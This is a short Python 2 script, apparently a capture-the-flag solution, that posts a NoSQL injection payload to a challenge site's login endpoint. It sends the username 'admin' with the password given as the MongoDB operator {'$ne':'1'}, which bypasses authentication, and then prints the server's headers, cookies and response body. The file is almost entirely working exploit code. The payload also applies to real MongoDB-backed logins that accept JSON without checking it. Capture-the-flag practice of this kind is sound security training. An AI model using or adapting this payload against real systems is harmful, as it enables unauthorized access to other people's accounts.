# python2
# coding = utf-8
import requests
import sys
import json

url = 'https://nosequels.2019.chall.actf.co/login'
cookie = {'token': sys.argv[1]}
header = {'Content-Type' : 'application/json'}
data = {"username":"admin", "password":{"$ne":"1"}}
proxy = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}


res = requests.post(
  'https://nosequels.2019.chall.actf.co/login',
  headers = header, 
  data = json.dumps(data),
  cookies = cookie
)



print res.headers
print res.cookies
print res.text
print res.content
